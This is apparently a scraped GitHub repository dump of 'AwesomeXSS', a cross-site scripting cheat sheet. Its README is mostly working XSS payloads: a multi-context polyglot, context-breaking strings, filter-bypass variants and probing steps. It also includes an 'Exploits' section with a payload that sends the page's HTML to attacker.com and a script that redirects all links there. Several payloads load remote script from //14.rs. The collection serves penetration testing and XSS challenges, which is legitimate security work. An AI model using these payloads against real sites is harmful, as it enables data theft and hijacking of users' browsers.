{
  "metadata": {
    "timestamp": 1736561525935,
    "page": 54,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjYw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "s0md3v/AwesomeXSS",
      "stars": 4830,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 0.0302734375,
          "content": "* linguist-language=javascript\n"
        },
        {
          "name": "Database",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0458984375,
          "content": "MIT License\n\nCopyright (c) 2018 Somdev Sangwan\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 11.76171875,
          "content": "# AwesomeXSS\nThis repository is a collection of Awesome XSS resources. Contributions are welcome and should be submitted via an issue.\n\n### Awesome contents\n- [Challenges](https://github.com/s0md3v/AwesomeXSS#awesome-challenges)\n- [Reads & Presentations](https://github.com/s0md3v/AwesomeXSS#awesome-reads--presentations)\n- [Tools](https://github.com/s0md3v/AwesomeXSS#awesome-tools)\n- [Mind maps](https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps)\n- [DOM XSS](https://github.com/s0md3v/AwesomeXSS#awesome-dom-xss)\n- [Payloads](https://github.com/s0md3v/AwesomeXSS#awesome-payloads)\n- [Polyglots](https://github.com/s0md3v/AwesomeXSS#awesome-polyglots)\n- [Tags and event handlers](https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers)\n- [Context breaking](https://github.com/s0md3v/AwesomeXSS#awesome-context-breaking)\n    - [HTML context](https://github.com/s0md3v/AwesomeXSS#html-context)\n    - [Attribute context](https://github.com/s0md3v/AwesomeXSS#attribute-context)\n    - [JavaScript context](https://github.com/s0md3v/AwesomeXSS#javascript-context)\n- [Confirm Variants](https://github.com/s0md3v/AwesomeXSS#awesome-confirm-variants)\n- [Exploits](https://github.com/s0md3v/AwesomeXSS#awesome-exploits)\n- [Probing](https://github.com/s0md3v/AwesomeXSS#awesome-probing)\n- [Bypassing](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)\n- [Encoding](https://github.com/s0md3v/AwesomeXSS#awesome-encoding)\n- [Tips & tricks](https://github.com/s0md3v/AwesomeXSS#awesome-tips--tricks)\n\n### Awesome Challenges\n- [prompt.ml](https://prompt.ml)\n- [alf.nu/alert1](https://alf.nu/alert1)\n- [xss-game.appspot.com](https://xss-game.appspot.com)\n- [polyglot.innerht.ml](https://polyglot.innerht.ml)\n- [sudo.co.il/xss](http://sudo.co.il/xss)\n- [root-me.org](https://www.root-me.org/?page=recherche&lang=en&recherche=xss)\n- [chefsecure.com](https://chefsecure.com/courses/xss/challenges)\n- [wechall.net](https://www.wechall.net/challs/XSS)\n- [codelatte.id/labs/xss](https://codelatte.id/labs/xss)\n\n### Awesome Reads & Presentations\n- [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)\n- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)\n- [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)\n- [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)\n- [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)\n- [Copy Pest](https://www.slideshare.net/x00mario/copypest)\n\n### Awesome Tools\n- [XSStrike](https://github.com/UltimateHackers/XSStrike)\n- [BeEF](https://github.com/beefproject/beef)\n- [JShell](https://github.com/UltimateHackers/JShell)\n\n### Awesome XSS Mind Maps\nA beautiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)\n\n### Awesome DOM XSS\n\n- Does your input go into a sink? `Vulnerable`\n- It doesn't? `Not vulnerable`\n\n**Source**: An input that could be controlled by an external (untrusted) source.\n\n```\ndocument.URL\ndocument.documentURI\ndocument.URLUnencoded (IE 5.5 or later Only)\ndocument.baseURI\nlocation\nlocation.href\nlocation.search\nlocation.hash\nlocation.pathname\ndocument.cookie\ndocument.referrer\nwindow.name\nhistory.pushState()\nhistory.replaceState()\nlocalStorage\nsessionStorage\n```\n\n**Sink**: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.\n\n```\neval\nFunction\nsetTimeout\nsetInterval\nsetImmediate\nexecScript\ncrypto.generateCRMFRequest\nScriptElement.src\nScriptElement.text\nScriptElement.textContent\nScriptElement.innerText\nanyTag.onEventName\ndocument.write\ndocument.writeln\nanyElement.innerHTML\nRange.createContextualFragment\nwindow.location\ndocument.location\n```\n\nThis comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).\n\n### Awesome Payloads\n```\n<A/hREf=\"j%0aavas%09cript%0a:%09con%0afirm%0d``\">z\n<d3\"<\"/onclick=\"1>[confirm``]\"<\">z\n<d3/onmouseenter=[2].find(confirm)>z\n<details open ontoggle=confirm()>\n<script y=\"><\">/*<script* */prompt()</script\n<w=\"/x=\"y>\"/ondblclick=`<`[confir\\u006d``]>z\n<a href=\"javascript%26colon;alert(1)\">click\n<a href=javas&#99;ript:alert(1)>click\n<script/\"<a\"/src=data:=\".<a,[8].some(confirm)>\n<svg/x=\">\"/onload=confirm()//\n<--`<img/src=` onerror=confirm``> --!>\n<svg%0Aonload=%09((pro\\u006dpt))()//\n<sCript x>(((confirm)))``</scRipt x>\n<svg </onload =\"1> (_=prompt,_(1)) \"\">\n<!--><script src=//14.rs>\n<embed src=//14.rs>\n<script x=\">\" src=//15.rs></script>\n<!'/*\"/*/'/*/\"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>\n<iframe/src \\/\\/onload = prompt(1)\n<x oncut=alert()>x\n<svg onload=write()>\n```\n\n### Awesome Polyglots\n\nHere's an XSS polyglot that I made which can break out of 20+ contexts:\n```\n%0ajavascript:`/*\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert()//'\">`\n```\n\nExplanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)\n\n### Awesome Tags & Event Handlers\n- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)\n- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)\n\nSome less detected event handlers\n```\nontoggle\nonauxclick\nondblclick\noncontextmenu\nonmouseleave\nontouchcancel\n```\n\nSome HTML Tags that you will be using\n```\nimg\nsvg\nbody\nhtml\nembed\nscript\nobject\ndetails\nisindex\niframe\naudio\nvideo\n```\n\n### Awesome Context Breaking\n\n#### HTML Context\nCase: `<tag>You searched for $input. </tag>`\n\n```\n<svg onload=alert()>\n</tag><svg onload=alert()>\n```\n\n#### Attribute Context\n\nCase: `<tag attribute=\"$input\">`\n\n```\n\"><svg onload=alert()>\n\"><svg onload=alert()><b attr=\"\n\" onmouseover=alert() \"\n\"onmouseover=alert()//\n\"autofocus/onfocus=\"alert()\n```\n#### JavaScript Context\n\nCase: `<script> var new something = '$input'; </script>`\n\n```\n'-alert()-'\n'-alert()//'\n'}alert(1);{'\n'}%0Aalert(1);%0A{'\n</script><svg onload=alert()>\n```\n\n### Awesome Confirm Variants\nYep, confirm because alert is too mainstream.\n```\nconfirm()\nconfirm``\n(confirm``)\n{confirm``}\n[confirm``]\n(((confirm)))``\nco\\u006efirm()\nnew class extends confirm``{}\n[8].find(confirm)\n[8].map(confirm)\n[8].some(confirm)\n[8].every(confirm)\n[8].filter(confirm)\n[8].findIndex(confirm)\n```\n\n### Awesome Exploits\n##### Replace all links\n```javascript\nArray.from(document.getElementsByTagName(\"a\")).forEach(function(i) {\n  i.href = \"https://attacker.com\";\n});\n```\n##### Source Code Stealer\n```html\n<svg/onload=\"(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML\">\n```\n\n### Awesome Probing\nIf nothing of this works, take a look at **Awesome Bypassing** section\n\nFirst of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.\n<br>Now for attribute context, check if double quotes (\") are being filtered by entering `x\"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>\nIf the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.\n<br>For javascript context, check which quotes are being used for example if they are doing\n```\nvariable = 'value' or variable = \"value\"\n```\nNow lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\\'d3v`, try escaping the backslash (\\) by adding a backslash to your probe i.e. `x\\'d3v`. If it works use the following payload:\n```\n\\'-alert()//\n```\nBut if it gets altered to `x\\\\\\'d3v`, the only thing you can try is closing the script tag itself by using\n```\n</script><svg onload=alert()>\n```\nFor simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using\n```\n<svg onload=alert()//\n```\nor this (it will not work in all cases)\n```\n<svg onload=alert()\n```\nIf the your dummy tags lands in the source code as it is, go for any of these payloads\n```\n<svg onload=alert()>\n<embed src=//14.rs>\n<details open ontoggle=alert()>\n```\n\n### Awesome Bypassing\n\n**Note:** None of these payloads use single (') or double quotes (\").\n\n- Without event handlers\n```\n<object data=javascript:confirm()>\n<a href=javascript:confirm()>click here\n<script src=//14.rs></script>\n<script>confirm()</script>\n```\n- Without space\n```\n<svg/onload=confirm()>\n<iframe/src=javascript:alert(1)>\n```\n- Without slash (/)\n```\n<svg onload=confirm()>\n<img src=x onerror=confirm()>\n```\n- Without equal sign (=)\n```\n<script>confirm()</script>\n```\n- Without closing angular bracket (>)\n```\n<svg onload=confirm()//\n```\n- Without alert, confirm, prompt\n```\n<script src=//14.rs></script>\n<svg onload=co\\u006efirm()>\n<svg onload=z=co\\u006efir\\u006d,z()>\n```\n- Without a Valid HTML tag\n```\n<x onclick=confirm()>click here\n<x ondrag=aconfirm()>drag it\n```\n\n- Bypass tag blacklisting\n```\n</ScRipT>\n</script\n</script/>\n</script x>\n```\n\n### Awesome Encoding\n\n|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|\n|----|----|-------|-----------|----|--------|----------|---|\n|`&quot;`|\"|`&#34;`|quotation mark|u+0022|\\0022|\\42|%22|\n|`&num;`|#|`&#35;`|number sign|u+0023|\\0023|\\43|%23|\n|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\\0024|\\44|%24|\n|`&percnt;`|%|`&#37;`|percent sign|u+0025|\\0025|\\45|%25|\n|`&amp;`|&|`&#38;`|ampersand|u+0026|\\0026|\\46|%26|\n|`&apos;`|'|`&#39;`|apostrophe|u+0027|\\0027|\\47|%27|\n|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\\0028|\\50|%28|\n|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\\0029|\\51|%29|\n|`&ast;`|*|`&#42;`|asterisk|u+002A|\\002a|\\52|%2A|\n|`&plus;`|+|`&#43;`|plus sign|u+002B|\\002b|\\53|%2B|\n|`&comma;`|,|`&#44;`|comma|u+002C|\\002c|\\54|%2C|\n|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\\002d|\\55|%2D|\n|`&period;`|.|`&#46;`|full stop; period|u+002E|\\002e|\\56|%2E|\n|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\\002f|\\57|%2F|\n|`&colon;`|:|`&#58;`|colon|u+003A|\\003a|\\72|%3A|\n|`&semi;`|;|`&#59;`|semicolon|u+003B|\\003b|\\73|%3B|\n|`&lt;`|<|`&#60;`|less-than|u+003C|\\003c|\\74|%3C|\n|`&equals;`|=|`&#61;`|equals|u+003D|\\003d|\\75|%3D|\n|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\\003e|\\76|%3E|\n|`&quest;`|?|`&#63;`|question mark|u+003F|\\003f|\\77|%3F|\n|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\\0040|\\100|%40|\n|`&lsqb;`|\\[|`&#91;`|left square bracket|u+005B|\\005b|\\133|%5B|\n|`&bsol;`|&bsol;|`&#92;`|backslash|u+005C|\\005c|\\134|%5C|\n|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\\005d|\\135|%5D|\n|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\\005e|\\136|%5E|\n|`&lowbar;`|_|`&#95;`|low line|u+005F|\\005f|\\137|%5F|\n|`&grave;`|\\`|`&#96;`|grave accent|u+0060|\\0060|\\u0060|%60|\n|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\\007b|\\173|%7b|\n|`&verbar;`|\\||`&#124;`|vertical bar|u+007c|\\007c|\\174|%7c|\n|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\\007d|\\175|%7d|\n\n### Awesome Tips & Tricks\n- `http(s)://` can be shortened to `//` or `/\\\\` or `\\\\`.\n- `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.\n- alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`\n- You can use `//` to close a tag instead of `>`.\n- I have found that `confirm` is the least detected pop-up function so stop using `alert`.\n- Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src=\"//14.rs\">`\n- The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)\n\n### Awesome Credits\nAll the payloads are crafted by me unless specified.\n"
        }
      ]
    }
  ]
}